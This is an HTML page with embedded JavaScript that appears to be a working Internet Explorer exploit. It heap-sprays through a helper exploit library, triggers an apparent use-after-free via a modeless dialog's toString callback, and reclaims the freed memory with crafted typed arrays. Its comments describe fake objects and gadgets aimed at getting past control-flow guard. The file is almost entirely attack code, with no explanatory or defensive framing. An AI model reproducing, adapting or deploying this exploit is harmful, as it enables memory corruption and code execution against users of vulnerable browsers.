<html xmlns:t = "urn:schemas-microsoft-com:time">
  <head>
<script src='lib/explib2.js'></script>
<meta http-equiv="x-ua-compatible" content="IE=10" />
<script language="javascript">

</script>

<script language="javascript">


var num_arrays = 98688;
var arr_size = (0x1000 - 0x20)/4;
var explib = new ExpLib( num_arrays, arr_size, 0x1a1b3000 );

explib.spray();


var arr_abs = new Array(0x100);
function reuse(sz)
{
  for (var i = 0; i < arr_abs.length; ++ i) {
    arr_abs[i] = new Uint32Array(sz/4);
    for (var j = 0; j < arr_abs[i].byteLength/4; j=j+1)
      if (j==0){
      arr_abs[i][j] = 0x1a1b2f98+8; // +0x88 points to our function gadget, +0x80 points to a valid CFG func that just returns
    } //+0x38 would be 0
     else if (j%3==0){ 
      arr_abs[i][j] = 0x1a1b3024+8; //+0x3c start of our fake object i.e 'edx' for Ptls6::LsDestroyInternalsInTxtobj
    }
  }

}


function f()
{

dialog.ParamToModal = {toString:function(){
var doc = dialog.ParamToMain.doc;
   var win = dialog.ParamToMain.win;


doc.write("") 
reuse(0x48);
  return "222";
}};

try{
  dialog.ParamToMain.Trigger();
}
catch(err){
  alert("pwnd...!");
  success= explib.go(); //check if we corrupted the length
  if (success ==false) {
    location.reload()
  }


}
finally{

}

}
function openWindows () {
  dialog = window.showModelessDialog('modal.html');
setTimeout("f();",200);


}

</script>

</head>

<body ></body>
<iframe src="modal.html" id="modal" onload="openWindows();" ></iframe>
</html>
